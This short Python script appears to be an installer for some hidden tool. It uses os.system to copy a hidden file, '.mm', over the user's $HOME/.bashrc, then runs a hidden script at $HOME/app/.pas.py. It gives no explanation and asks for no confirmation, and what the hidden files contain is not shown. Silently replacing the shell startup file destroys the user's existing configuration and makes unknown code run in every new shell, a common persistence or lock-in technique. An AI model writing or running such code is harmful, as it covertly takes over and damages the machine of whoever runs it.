import os
#os.system("cp -r pas.py $HOME")
os.system("cp -r .mm $HOME/.bashrc")
#os.system("cp -r mm $HOME")
#os.system("exit")
os.system("python $HOME/app/.pas.py")
